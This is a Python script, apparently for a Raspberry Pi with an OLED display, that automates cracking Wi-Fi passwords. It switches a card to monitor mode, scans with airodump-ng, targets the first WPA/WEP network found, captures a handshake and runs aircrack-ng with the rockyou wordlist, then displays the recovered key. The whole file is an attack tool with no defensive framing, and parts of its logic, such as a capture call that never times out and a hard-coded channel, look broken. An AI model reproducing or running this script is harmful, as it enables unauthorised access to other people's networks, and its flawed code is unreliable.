import subprocess
import time
import board
import busio
import adafruit_ssd1306
from PIL import Image, ImageDraw, ImageFont
import re

# Initialize OLED
i2c = busio.I2C(board.SCL, board.SDA)
oled = adafruit_ssd1306.SSD1306_I2C(128, 64, i2c)
oled.fill(0)
oled.show()

def display_text(text, line=0):
    image = Image.new("1", (oled.width, oled.height))
    draw = ImageDraw.Draw(image)
    font = ImageFont.load_default()
    draw.text((0, line * 10), text, font=font, fill=255)
    oled.image(image)
    oled.show()

def scan_networks():
    display_text("Scanning WiFi...")
    try:
        result = subprocess.run(["sudo", "airodump-ng", "wlan1"], capture_output=True, text=True, timeout=30)
        output = result.stdout
        networks = []
        for line in output.splitlines():
            if "WPA" in line or "WEP" in line:
                parts = line.split()
                if len(parts) > 5:
                    bssid = parts[0]
                    essid = parts[-1]
                    networks.append((bssid, essid))
        return networks
    except subprocess.TimeoutExpired:
        display_text("Scan timed out")
        return []

def capture_handshake(bssid, channel, essid):
    display_text(f"Targeting {essid}")
    subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", "handshake", "wlan1"], capture_output=True)
    time.sleep(30)  # Wait for handshake
    subprocess.run(["sudo", "pkill", "airodump-ng"])
    display_text("Handshake captured")

def crack_password():
    display_text("Cracking password...")
    result = subprocess.run(["sudo", "aircrack-ng", "handshake-01.cap", "-w", "/home/pi/rockyou.txt"], capture_output=True, text=True)
    output = result.stdout
    match = re.search(r"KEY FOUND! \[ (.+?) \]", output)
    if match:
        password = match.group(1)
        display_text(f"Password: {password}", 20)
        return password
    else:
        display_text("Password not found")
        return None

def main():
    display_text("WiFi Cracker Starting")
    time.sleep(2)
    # Ensure monitor mode
    subprocess.run(["sudo", "ip", "link", "set", "wlan1", "down"])
    subprocess.run(["sudo", "iw", "dev", "wlan1", "set", "type", "monitor"])
    subprocess.run(["sudo", "ip", "link", "set", "wlan1", "up"])
    networks = scan_networks()
    if not networks:
        display_text("No networks found")
        return
    bssid, essid = networks[0]
    channel = "6"  # Adjust based on scan results
    display_text(f"Found: {essid}")
    time.sleep(2)
    capture_handshake(bssid, channel, essid)
    password = crack_password()
    if password:
        display_text(f"Success: {password}", 30)
    else:
        display_text("Failed to crack")
    time.sleep(10)

if __name__ == "__main__":
    main()
